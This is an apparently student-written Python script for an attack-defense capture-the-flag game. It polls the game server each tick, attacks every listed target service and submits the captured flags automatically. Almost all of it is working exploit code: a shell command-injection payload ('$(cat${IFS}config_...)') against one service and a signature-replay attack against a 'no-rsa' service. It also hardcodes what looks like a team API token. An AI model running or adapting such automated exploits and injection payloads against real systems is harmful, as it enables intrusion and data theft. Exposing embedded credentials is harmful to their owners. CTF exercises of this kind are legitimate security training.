from swpag_client import Team
import json
import socket
import time
from pprint import pprint

def netcat(hostname, port, content):
    print 'content:', content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    ret_list = []
    i = 0
    while i<10:
        data = s.recv(1024)
        #print repr(data)
        if data == "":
            break
        ret_list.append(repr(data))
        i += 1
        #print "Received:", repr(data)
    #print "Connection closed."
    s.close()
    return ret_list

def exploit_configuration(hostname, port, flagId):
    print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
    content = 'd'+ "\n" + 'a' + "\n" + '$(cat${IFS}config_'+flagId+')' "\n"+ 's'+ "\n"
    ret_list = netcat(hostname, port, content)
    #print 'ret_list:'
    #pprint(ret_list)
    file_name = ret_list[2].split()[4]
    #print file_name,file_name.index('!')
    file_name = file_name[:file_name.index('!')]
    #print file_name
    #print "\n\n\n\n\n\n"
    content = 'l' + "\n" + file_name + "\n" + "\n" + 'v'
    ret_list = netcat(hostname, port, content)
    #print 'ret_list:'
    #pprint(ret_list)
    flag = ret_list[5].split('[*]')[0].split()[3]
    eqIndex = flag.index('=')
    eqIndex += 1
    #print flag, flag.index('='), flag[eqIndex:-2]
    flag = flag[eqIndex:-2]
    print 'FLAG================================================================================================:', flag
    print(t.submit_flag([flag]))
    #exit()

def exploit_no_rsa(hostname, port, flagId):
    print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
    content = 'S'+ "\n" + '0' + flagId
    ret_list = netcat(hostname, port, content)
    #print 'ret_list:', ret_list
    sigLine = ret_list[2]
    #print 'sigline:',sigLine
    lineArr = sigLine.split('\\n')
    #print 'lineArr:', lineArr
    sig = lineArr[1]
    #print 'sig:', sig
    content = 'R' + "\n" + flagId + ' ' + sig
    #print 'content:', content
    ret_list = netcat(hostname, port, content)
    #print ret_list
    flag_line = ret_list[1]
    #print 'flag_line:',flag_line
    lineArr = flag_line.split('\\n')
    #print 'lineArr:', lineArr
    flag_line = lineArr[1]
    print 'flag_line:', flag_line
    flag = flag_line.split(' ')[3]
    print 'FLAG================================================================================================:',flag
    print(t.submit_flag([flag]))	    

t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
print(t.game_url)
#print(t.get_vm())
while True:
    gameStatus = t.get_game_status()
    print('gameStatus:',gameStatus)
    currentTick = gameStatus['tick']['tick_id']
    print(t.get_service_list())
    #t.get_targets(service_id)
    services = t.get_service_list()
    print('services:',services)
    print()
    print()
    for service in services:
        print 'SERVICE NAME:',service
        print 'SERVICE ID:',service['service_id']
        service_id = service['service_id']
        service_name = service['service_name']
        print 'service_name:',service_name
        targets = t.get_targets(service_id)
        for target in targets:
            print('TARGET NAME:',target)#,netcat(target,''))
            hostname = target['hostname']
            port = target['port']
            flag_id = target['flag_id']
            if service_name == 'no-rsa':
                try:
                    #pass
                    exploit_no_rsa(hostname,port,flag_id)
                except:
                    print 'Exception occured for user'
            else:
                try:
                    #pass
                    exploit_configuration(hostname, port, flag_id)
                except:
                    print 'Exception occured for user'
            #break
    while True:
        newGameStatus = t.get_game_status()
        newTick = newGameStatus['tick']['tick_id']
        print 'Checking new tick:',newTick
        if newTick != currentTick:
            break
        time.sleep(10)
